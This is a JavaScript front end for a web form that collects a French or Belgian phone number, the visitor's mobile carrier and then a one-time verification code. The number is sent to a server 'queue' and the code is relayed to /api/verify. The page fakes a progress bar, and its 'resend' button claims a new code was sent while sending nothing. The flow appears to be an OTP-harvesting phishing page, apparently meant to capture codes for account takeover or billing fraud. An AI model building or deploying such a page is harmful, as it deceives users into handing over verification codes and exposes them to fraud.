const API_URL = window.location.origin;

// State
let selectedCountry = null;
let selectedNetwork = null;
let phoneNumber = null;
let queueId = null;
let currentStep = 1;
let otpLength = 4;

// Country configs
const COUNTRIES = {
    FR: {
        name: 'France',
        code: '+33',
        networks: ['Orange', 'SFR', 'Bouygues', 'Free'],
        queue: 'A'
    },
    BE: {
        name: 'Belgium',
        code: '+32',
        networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'],
        queue: 'B'
    }
};

function selectCountry(country) {
    selectedCountry = country;
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    
    const networks = COUNTRIES[country].networks;
    const grid = document.getElementById('networkGrid');
    grid.innerHTML = '';
    networks.forEach(net => {
        const btn = document.createElement('button');
        btn.className = 'network-btn';
        btn.textContent = net;
        btn.onclick = () => selectNetwork(net);
        grid.appendChild(btn);
    });
}

function selectNetwork(network) {
    selectedNetwork = network;
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
    document.getElementById('countryCode').textContent = COUNTRIES[selectedCountry].code;
}

async function sendNumber() {
    const input = document.getElementById('phoneInput');
    phoneNumber = input.value.replace(/\s/g, '');
    
    if (!phoneNumber || phoneNumber.length < 8) {
        alert('Please enter a valid phone number.');
        return;
    }
    
    const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
    
    document.getElementById('step3').style.display = 'none';
    document.getElementById('step4').style.display = 'block';
    
    // Animate progress
    let progress = 0;
    const fill = document.getElementById('progressFill');
    const interval = setInterval(() => {
        progress += Math.random() * 10;
        if (progress > 90) clearInterval(interval);
        fill.style.width = Math.min(progress, 90) + '%';
    }, 300);
    
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                number: fullNumber,
                country: selectedCountry,
                network: selectedNetwork,
                queue: COUNTRIES[selectedCountry].queue
            })
        });
        
        const data = await response.json();
        queueId = data.queueId;
        
        clearInterval(interval);
        fill.style.width = '100%';
        
        setTimeout(() => {
            document.getElementById('step4').style.display = 'none';
            showOTPStep();
        }, 500);
        
    } catch (error) {
        alert('Error connecting to server. Please try again.');
        resetAll();
    }
}

function showOTPStep() {
    document.getElementById('step5').style.display = 'block';
    document.getElementById('displayNumber').textContent = COUNTRIES[selectedCountry].code + phoneNumber;
    
    // Show correct number of OTP inputs
    const inputs = document.querySelectorAll('.otp-input');
    inputs.forEach((el, i) => {
        el.style.display = i < otpLength ? 'block' : 'none';
        el.value = '';
    });
    
    document.getElementById('otp1').focus();
    
    // Auto-tab
    document.querySelectorAll('.otp-input').forEach((input, idx, arr) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && idx < arr.length - 1) {
                arr[idx + 1].focus();
            }
        });
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                arr[idx - 1].focus();
            }
            if (e.key === 'Enter') {
                verifyOTP();
            }
        });
    });
}

async function verifyOTP() {
    const inputs = document.querySelectorAll('.otp-input');
    let otp = '';
    for (let i = 0; i < otpLength; i++) {
        otp += inputs[i].value;
    }
    
    if (otp.length !== otpLength) {
        alert('Please enter the complete verification code.');
        return;
    }
    
    try {
        const response = await fetch('/api/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                queueId: queueId,
                otp: otp,
                action: 'verify'
            })
        });
        
        const data = await response.json();
        if (data.success) {
            document.getElementById('step5').style.display = 'none';
            document.getElementById('step6').style.display = 'block';
        } else {
            document.getElementById('step5').style.display = 'none';
            document.getElementById('step7').style.display = 'block';
            document.getElementById('errorMessage').textContent = data.message || 'Invalid code. Please try again.';
        }
    } catch (error) {
        alert('Error verifying OTP. Please try again.');
    }
}

function resendOTP() {
    alert('A new code has been sent to your number.');
    // Reset OTP inputs
    document.querySelectorAll('.otp-input').forEach(el => el.value = '');
    document.getElementById('otp1').focus();
}

function goBackToOTP() {
    document.getElementById('step7').style.display = 'none';
    document.getElementById('step5').style.display = 'block';
    document.querySelectorAll('.otp-input').forEach(el => el.value = '');
    document.getElementById('otp1').focus();
}

function resetAll() {
    document.querySelectorAll('#step1, #step2, #step3, #step4, #step5, #step6, #step7').forEach(el => {
        el.style.display = 'none';
    });
    document.getElementById('step1').style.display = 'block';
    document.getElementById('phoneInput').value = '';
    selectedCountry = null;
    selectedNetwork = null;
    phoneNumber = null;
    queueId = null;
    currentStep = 1;
}